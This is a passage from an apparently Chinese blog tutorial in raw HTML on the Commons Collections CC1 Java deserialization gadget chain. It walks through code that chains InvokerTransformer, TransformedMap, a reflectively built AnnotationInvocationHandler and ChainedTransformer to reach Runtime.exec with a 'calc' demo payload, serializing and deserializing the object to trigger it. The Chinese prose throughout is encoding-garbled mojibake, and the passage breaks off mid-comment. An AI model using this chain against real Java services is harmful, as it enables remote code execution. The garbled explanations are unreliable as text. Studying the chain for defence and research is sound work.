ä½†æ˜¯æ˜¯protectedï¼Œåªèƒ½å†…éƒ¨ç±»è®¿é—®ï¼Œæƒé™ä¸å¤Ÿï¼Œå¾€ä¸Šæ‰¾ï¼ŒæŸ¥çœ‹æ˜¯è°å…·ä½“è°ƒç”¨äº†æ–¹æ³•checkSetValue()å†…éƒ¨çš„è¿™ä¸ªtransform()ï¼Œå‘ç°æ˜¯valueTransformerè¿›è¡Œè°ƒç”¨ï¼ŒæŸ¥çœ‹valueTransformerï¼Œå‘ç°valueTransformerä¹Ÿæ˜¯protectæƒé™ï¼Œç»§ç»­æŸ¥çœ‹valueTransformerä»å“ªé‡Œæ¥çš„ï¼Œæœ€åæˆ‘ä»¬å‘ç°decorate()è°ƒç”¨TransformedMap()çš„æ„é€ æ–¹æ³•æ¥çš„ï¼Œæ‰€æœ‰æ¶‰åŠåˆ°çš„æ–¹æ³•ï¼Œåªæœ‰decorateçš„æƒé™ä¿®é¥°ç¬¦æ˜¯public</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆè¿™ä¸ªdecorateç±»æˆ‘ä»¬å°±å¯ä»¥è¿›ä¸€æ­¥æ§åˆ¶valueTransformer</p><p>å…³é”®ï¼š<code>TransformedMap</code> æœ¬èº«ä¸å­˜å‚¨æ•°æ®ï¼Œè€Œæ˜¯å°†æ“ä½œå§”æ‰˜ç»™åŸå§‹ <code>HashMap</code>ï¼Œå¹¶åœ¨æ“ä½œå‰åè§¦å‘è½¬æ¢å™¨é€»è¾‘ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¿™é‡Œç©¿æ’ä¸€ä¸‹TransformedMapè£…é¥°å™¨æœ¬äº‹å°±åƒæ˜¯ä¸€ä¸ªå¤–æŒ‚æ²¡æœ‰å®é™…ä½œç”¨éœ€è¦HashMapæ¥å­˜å‚¨é”®å€¼å¯¹ï¼Œéœ€è¦æŠ«æŒ‚åœ¨HashMapä¸Šæ‰èƒ½å‘æŒ¥ä½œç”¨</span><br></pre></td></tr></table></figure><p>ç”±äºæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯transformMapçš„æ–¹æ³•ï¼Œæ‰€ä»¥å…ˆå»æ„å»ºä¸€ä¸ªHashMapï¼Œå†é€šè¿‡è¿™ä¸ªmapæ¥è°ƒç”¨transformerå†…çš„decorate()æ¥å®Œæˆä¸€ä¸ªtransformedMapçš„å®ä¾‹åŒ–ï¼Œæœ€åå†æƒ³åŠæ³•è§¦å‘checkSetValue()æ–¹æ³•å³å¯</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime r=Runtime.*getRuntime*();</span><br><span class="line">InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//invokerTransformer.transform(r);</span></span><br><span class="line"> HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(); <span class="comment">//è¿™ä¸ªç›´æ¥å®ä¾‹åŒ–ä¸€ä¸ªHashMap</span></span><br><span class="line"></span><br><span class="line"> Map&lt;Object,Object&gt; transformedmap=TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer); </span><br><span class="line"><span class="comment">//é™æ€æ–¹æ³•staicä¿®é¥°ç›´æ¥ç±»åï¼‹æ–¹æ³•åè°ƒç”¨</span></span><br><span class="line"><span class="comment">//æŠŠmapå½“æˆå‚æ•°ä¼ å…¥ï¼Œç„¶åç¬¬äºŒä¸ªå‚æ•°æˆ‘ä»¬ç”¨ä¸ç€å°±èµ‹ç©ºå€¼null,ç¬¬ä¸‰ä¸ªå‚æ•°å°±æ˜¯æˆ‘ä»¬ä¹‹å‰çš„invokerTransformer.</span></span><br></pre></td></tr></table></figure><p><strong>å¯»æ‰¾è°ƒç”¨checkSetValue()çš„æ–¹æ³•</strong></p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/20250320142341.png"></p><p>å‘ç°AbstractlnputCheckedMapDecoratorç±»ç§çš„setValueæ–¹æ³•å¯ä»¥è¿›è¡Œå¯¹checkSetvalueçš„è°ƒç”¨é‚£ä¹ˆå°±</p><p><code>checkSetValue()</code>æ˜¯<code>TransformedMap</code>çš„å…³é”®æ–¹æ³•ï¼Œç”¨äºåœ¨å€¼è¢«ä¿®æ”¹æ—¶åº”ç”¨è½¬æ¢é€»è¾‘ã€‚å½“è°ƒç”¨ <code>Map.Entry.setValue()</code> ä¿®æ”¹æ¡ç›®å€¼æ—¶ï¼Œ<code>TransformedMap</code> çš„ <code>checkSetValue()</code> ä¼šè¢«è§¦å‘ï¼Œå¯¹å€¼è¿›è¡Œè½¬æ¢ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç©¿æ’ï¼šMapé‡Œå­˜å‚¨äº†é”®å€¼å¯¹,æ¯ä¸€ä¸ªé”®å€¼å¯¹è¢«javaå°è£…æˆä¸€ä¸ªEntryå¯¹è±¡ï¼Œå½“æƒ³ä¿®æ”¹é”®å€¼å¯¹çš„å€¼çš„æ—¶å€™å°±å¯ä»¥å¯ä»¥ç›´æ¥é€šè¿‡`Entry`çš„`setValue()`æ–¹æ³•è¿›è¡Œä¿®æ”¹ï¼Œè¿™é‡Œå› ä¸ºæœ‰è£…é¥°å™¨TransformedMapï¼Œè£…é¥°å™¨TransformedMapç›‘å¬å¯¹å€¼çš„ä¿®æ”¹æ“ä½œï¼Œå°±æ˜¯æ¯å½“æƒ³è°ƒç”¨**`setValue()`æ—¶ï¼Œå¤–æŒ‚ä¼šå…ˆè§¦å‘`checkSetValue()`æ–¹æ³•**ï¼Œå¯¹ä¿®æ”¹çš„å€¼åšé¢å¤–çš„å¤„ç†</span><br></pre></td></tr></table></figure><p>MapEntryç±»å®é™…ä¸Šæ˜¯é‡å†™çˆ¶ç±»AbstractMapEntryDecoratorçš„setValue()æ–¹æ³•</p><p>MapEntryçš„çˆ¶ç±»AbstractMapEntryDecoratoråˆå¼•å…¥äº†Map.Entryæ¥å£ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è¿›è¡Œå¸¸ç”¨çš„Mapéå†ï¼Œå°±å¯ä»¥è°ƒç”¨setValue()ï¼Œï¼Œç„¶åæ°´åˆ°æ¸ æˆçš„è°ƒç”¨checkSetValue()</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è§£é‡Šä¸‹ä¸ºä»€ä¹ˆè¦éå†ï¼š`TransformedMap`çš„æœºåˆ¶**ï¼šå®ƒé€šè¿‡è£…é¥°`Map.Entry`å¯¹è±¡ï¼ˆæ¯ä¸ªçº¸æ¡ï¼‰æ¥ç›‘å¬ä¿®æ”¹æ“ä½œï¼Œç›´æ¥è°ƒç”¨`map.put(&quot;é”®&quot;, &quot;æ–°å€¼&quot;)`å¯èƒ½ç»•å¼€å¤–æŒ‚ç¨‹åºï¼Œéå†åé€šè¿‡`entry.setValue()`ä¿®æ”¹ï¼Œæ‰èƒ½ç¡®ä¿å¤–æŒ‚ç¨‹åºè¢«è°ƒç”¨ï¼Œ**åº•å±‚åŸå› ï¼šTransformedMap`çš„`Map.Entry`æ˜¯æ”¹è£…è¿‡çš„ï¼ˆ`AbstractMapEntryDecorator`çš„å­ç±»ï¼‰ï¼Œå®ƒçš„`setValue()`æ–¹æ³•è¢«é‡å†™ï¼Œä¸»åŠ¨è°ƒç”¨`checkSetValue()ï¼Œéå†æ˜¯ç¡®ä¿æ¯ä¸ª`Entry`éƒ½ä½¿ç”¨æ”¹è£…åçš„æ–¹æ³•çš„å…³é”®æ­¥éª¤ </span><br></pre></td></tr></table></figure><p>ä¸€å¥è¯å°±æ˜¯ç¡®ä¿æ¯ä¸ª<code>Entry</code>éƒ½ä½¿ç”¨æ”¹è£…åçš„æ–¹æ³•ï¼Œè¿›è€Œæ›´å¥½è°ƒç”¨setvalueå»è°ƒç”¨checkSetvalue</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMapDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">â€‹    map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>); <span class="comment">//ç»™mapä¸€ä¸ªé”®å€¼å¯¹ï¼Œæ–¹ä¾¿éå†</span></span><br><span class="line"></span><br><span class="line">â€‹    <span class="comment">//æ„é€ transformedmapæ˜¯è°ƒç”¨tranform()çš„å‰ç½®æ¡ä»¶</span></span><br><span class="line">â€‹    Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(</span><br><span class="line">â€‹            map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line">â€‹    <span class="keyword">for</span>(Map.Entry entry:transformedMap.entrySet()) &#123;   <span class="comment">//éå†Mapå¸¸ç”¨æ ¼å¼</span></span><br><span class="line">â€‹        <span class="comment">//è°ƒç”¨setValueæ–¹æ³•ï¼Œé€šè¿‡setValueå»è§¦å‘checkSetValue()</span></span><br><span class="line">â€‹        entry.setValue(runtime);      </span><br><span class="line">â€‹    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for(Map.Entry entry:transformedMap.entrySet()) &#123;   *//éå†Mapå¸¸ç”¨æ ¼å¼*    entry.setValue(runtime);                      &#125;</span><br></pre></td></tr></table></figure><p>  åœ¨è¿™é‡Œï¼Œ transformedMapæ˜¯ç»è¿‡è£…é¥°çš„ Mapå¯¹è±¡ï¼Œå…·æœ‰ç‰¹æ®Šçš„è¡Œä¸ºã€‚é€šè¿‡ entrySet() æ–¹æ³•è·å–äº†é”®å€¼å¯¹çš„é›†åˆï¼Œç„¶åè¿›è¡Œéå†ã€‚transformedMap.entrySet()è¿”å›çš„æ˜¯ä¸€ä¸ªåŒ…å« <code>Map.Entry</code> å¯¹è±¡çš„é›†åˆï¼Œè¿™æ ·å°±å¯ä»¥éå† M ap çš„é”®å€¼å¯¹ã€‚Map.Entry æ˜¯ä¸€ä¸ªå†…éƒ¨æ¥å£ï¼Œç”¨äºè¡¨ç¤º<code>Map</code>ä¸­ çš„é”®å€¼å¯¹ï¼Œå…¶ä¸­å¯ä»¥é€šè¿‡ getKey() è·å–é”®ï¼Œé€šè¿‡ getValue()è·å–å€¼ã€‚</p><p>å› ä¸ºMapé‡Œçš„entrySet()æ˜¯è¢«transformedMapè£…é¥°å™¨è¿›è¡Œå¤–æŒ‚çš„ï¼Œæœ¬æ¥æ˜¯è¦å»Mapç§çš„setvalueæ–¹æ³•ï¼Œä½†æ˜¯ç»è¿‡è£…é¥°å™¨çš„å®šä¹‰ç»˜åˆ¶è¡—é“MapEntryç§è°ƒç”¨é‡Œé¢çš„setValueæ–¹æ³•è¿›è€Œå»è°ƒç”¨checkSetValueæ–¹æ³•</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/d7418d2c06802f2f2f3715b5cd7b0d2.png"></p><p>æ¢³ç†</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/9b9e63ced9a4747901d62b2c7088a6c.png"></p><p>é¦–å…ˆï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†TransformedMapè¿™ä¸ªç±»ï¼Œæˆ‘ä»¬æƒ³è¦è°ƒç”¨å…¶ä¸­çš„checkSetValueæ–¹æ³•ï¼Œä½†æ˜¯è¿™ä¸ªç±»çš„æ„é€ å™¨æ˜¯peotectedæƒé™ï¼Œåªèƒ½ç±»ä¸­è®¿é—®ï¼Œæ‰€ä»¥æˆ‘ä»¬è°ƒç”¨decorateæ–¹æ³•æ¥å®ä¾‹åŒ–è¿™ä¸ªç±»ï¼Œ</p><p> åœ¨æ­¤ä¹‹å‰æˆ‘ä»¬å…ˆå®ä¾‹åŒ–äº†ä¸€ä¸ªHashMap,å¹¶ä¸”è°ƒç”¨äº†putæ–¹æ³•ç»™ä»–èµ‹äº†ä¸€ä¸ªé”®å€¼å¯¹(è¿™é‡Œæ˜¯ä¸ºäº†è®©æˆ‘ä»¬å†åè¾¹çš„éå†ä¸­è°ƒç”¨setValue()æä¾›å‰ç½®æ¡ä»¶)ï¼Œç„¶åæŠŠè¿™ä¸ªmapå½“æˆå‚æ•°ä¼ å…¥ï¼Œå®ä¾‹åŒ–æˆäº†ä¸€ä¸ªtransformedmapå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡ä¹Ÿæ˜¯Mapç±»å‹çš„ï¼Œ</p><p> ç„¶åæˆ‘ä»¬å¯¹è¿™ä¸ªå¯¹è±¡è¿›è¡Œéå†ï¼Œåœ¨éå†è¿‡ç¨‹ä¸­æˆ‘ä»¬å¯ä»¥è°ƒç”¨setValueæ–¹æ³•ï¼Œè€Œæ°å¥½åˆé‡åˆ°äº†ä¸€ä¸ªé‡å†™äº†setValueçš„çˆ¶ç±»ï¼Œè¿™ä¸ªé‡å†™çš„æ–¹æ³•åˆšå¥½è°ƒç”¨äº†checkSetValueæ–¹æ³•ï¼Œè¿™æ ·å°±å½¢æˆäº†ä¸€ä¸ªé—­ç¯</p><p><strong>è¿½å¯»setValueï¼Œæ‰¾åˆ°readObject()</strong></p><h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">    <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                  value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                memberValue.setValue(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                        value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°äº†readobjectä¸‹è°ƒç”¨äº†setvalue</p><p>ç”±äºmemberValueså¯æ§ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ä¼ å…¥è‡ªå·±éœ€è¦çš„ï¼Œç„¶åå®ç°setValueæ–¹æ³•</p><p>ä½†æ˜¯è¿™ä¸ªç±»æ²¡æœ‰è¯´æ˜æ˜¯ä¸æ˜¯publicä¹‹ç±»çš„ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åªèƒ½åœ¨åŒ…é‡Œé¢è¿›è¡Œdiaoyongï¼Œè¦æƒ³åœ¨å¤–éƒ¨è°ƒç”¨çš„è¯å°±å¿…é¡»ä½¿ç”¨åå°„</p><p>copyçš„ç²—ç•¥çš„ä»£ç </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">    <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">            <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">    HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>); <span class="comment">//ç»™mapä¸€ä¸ªé”®å€¼å¯¹ï¼Œæ–¹ä¾¿éå†</span></span><br><span class="line"></span><br><span class="line">Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–sun.reflect.annotation.AnnotationInvocationHandlerç±»çš„Classå¯¹è±¡</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–æŒ‡å®šå‚æ•°ç±»å‹çš„æ„é€ å‡½æ•°Constructorå¯¹è±¡ï¼Œè¿™é‡Œæˆ‘ä»¬èƒ½è·å–åˆ°ä¼°è®¡å°±æ˜¯å®ƒçš„é‚£ä¸ªæ„é€ å‡½æ•°</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line"><span class="comment">// ç›¸å½“äºæå‡è‡ªå·±æƒé™ï¼Œä»¥ä¾¿å¯ä»¥è®¿é—®éå…¬å…±æ„é€ å‡½æ•°</span></span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¿™é‡Œç¬¬ä¸€ä¸ªæ˜¯å‚æ•°æ˜¯æ³¨è§£çš„ç±»åŸå‹ï¼Œç¬¬äºŒä¸ªå°±æ˜¯æˆ‘ä»¬ä¹‹å‰çš„ç±»</span></span><br><span class="line"><span class="comment">// ä½¿ç”¨newInstance()æ–¹æ³•åˆ›å»ºä¸€ä¸ªæ–°çš„AnnotationInvocationHandlerå®ä¾‹</span></span><br><span class="line"><span class="comment">// ä¼ é€’Override.classå’Œdecorateä¸¤ä¸ªå‚æ•°ç»™æ„é€ å‡½æ•°</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Override.class, transformedMap);</span><br><span class="line">serialize(o);  <span class="comment">//åºåˆ—åŒ–</span></span><br><span class="line">unserialize(<span class="string">&quot;CC1.txt&quot;</span>); <span class="comment">//ååºåˆ—åŒ–</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å®šä¹‰åºåˆ—åŒ–æ–¹æ³•</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CC1.txt&quot;</span>));</span><br><span class="line">   oos.writeObject(object);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®šä¹‰ååºåˆ—åŒ–æ–¹æ³•</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">   ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">   objectInputStream.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°æ²¡æœ‰å¼¹å‡ºè®¡ç®—å™¨</p><h1 id="è§£å†³ä¸‰ä¸ªé—®é¢˜"><a href="#è§£å†³ä¸‰ä¸ªé—®é¢˜" class="headerlink" title="è§£å†³ä¸‰ä¸ªé—®é¢˜"></a>è§£å†³ä¸‰ä¸ªé—®é¢˜</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. Runtimeæ˜¯æ²¡æœ‰å®ç°Serializableæ¥å£çš„ï¼Œæ— æ³•åºåˆ—åŒ–</span><br><span class="line">2. AnnotationInvocationHandlerä¸­çš„readObjectæ‰§è¡Œ memberValue.setValueéœ€è¦ç»•è¿‡ä¸¤ifåˆ¤æ–­</span><br><span class="line">3. memberValue.setValueä¸­çš„å€¼æ— æ³•æ§åˆ¶</span><br></pre></td></tr></table></figure><h3 id="Runtimeæ˜¯æ²¡æœ‰å®ç°Serializableæ¥å£çš„ï¼Œæ— æ³•åºåˆ—åŒ–"><a href="#Runtimeæ˜¯æ²¡æœ‰å®ç°Serializableæ¥å£çš„ï¼Œæ— æ³•åºåˆ—åŒ–" class="headerlink" title="Runtimeæ˜¯æ²¡æœ‰å®ç°Serializableæ¥å£çš„ï¼Œæ— æ³•åºåˆ—åŒ–"></a>Runtimeæ˜¯æ²¡æœ‰å®ç°Serializableæ¥å£çš„ï¼Œæ— æ³•åºåˆ—åŒ–</h3><p>è™½ç„¶Runtimeæ˜¯æ²¡æœ‰å®ç°Serializableæ¥å£çš„ï¼Œå¯ä»¥è¿ç”¨åå°„æ¥è·å–å®ƒçš„åŸå‹ç±»ï¼Œå®ƒçš„åŸå‹ç±»Classæ˜¯å­˜åœ¨serializableæ¥å£ï¼Œå¯ä»¥åºåˆ—åŒ–çš„</p><p>æ”¹æˆä¸‹é¢è¿™ç§å½¢å¼</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        Class rc=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);                 <span class="comment">//è·å–ç±»åŸå‹</span></span><br><span class="line">        Method getRuntime= rc.getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>);    <span class="comment">//è·å–getRuntimeæ–¹æ³•ï¼Œ</span></span><br><span class="line">        Runtime r=(Runtime) getRuntime.invoke(<span class="literal">null</span>,<span class="literal">null</span>);    <span class="comment">//è·å–å®ä¾‹åŒ–å¯¹è±¡ï¼Œå› ä¸ºè¯¥æ–¹æ³•ä¸ºæ— å‚æ–¹æ³•ï¼Œæ‰€ä»¥å…¨ä¸ºnull</span></span><br><span class="line">        Method exec=rc.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);        <span class="comment">//è·å–execæ–¹æ³•</span></span><br><span class="line">        exec.invoke(r,<span class="string">&quot;calc&quot;</span>);                                         <span class="comment">//å®ç°å‘½ä»¤æ‰§è¡Œ</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ”¹æˆè¿™æ ·ä¹Ÿæ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„ï¼›ä½†æ˜¯é—®é¢˜åˆæ¥äº†ï¼Œä¸Šé¢ä¸€å…±æ‰§è¡Œäº†ä¸‰æ¬¡<code>transform</code>æ–¹æ³•ã€‚ä½†æ˜¯<code>InvokerTransformer</code>ç±»ä¸­åªèƒ½æ‰§è¡Œä¸€æ¬¡<code>transform</code>æ–¹æ³•ï¼›</p><p>è¿™é‡Œåˆè¦ä»‹ç»ä¸€ä¸ªéœ€è¦åˆ©ç”¨çš„ç±»<code>ChainedTransformer</code>;å¯ä»¥çœ‹ä¸€ä¸‹æ­¤ç±»çš„æ„é€ æ–¹æ³•å’Œ<code>transform</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ä¼ é€’ä¸€ä¸ªtransformersæ–¹æ³•</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¸€ä¸ªforå¾ªç¯ï¼Œå°†ä¸Šä¸€ä¸ªå¯¹è±¡å½“ä½œä¸‹ä¸€ä¸ªå‡½æ•°æ‰§è¡Œï¼Œå¾ªç¯åµŒå¥—</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨chainedTransformer</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">     <span class="type">Class</span> <span class="variable">runtimeClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);  <span class="comment">//è·å–åŸå‹ç±»</span></span><br><span class="line">     Transformer[] Transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">     &#125;;</span><br><span class="line">     <span class="comment">//è°ƒç”¨å«å‚æ„é€ å™¨ä¼ å…¥Transformeræ•°ç»„ï¼Œç„¶åè°ƒç”¨transformæ–¹æ³•ï¼Œè¿™é‡Œå¯¹è±¡åªéœ€è¦ä¼ 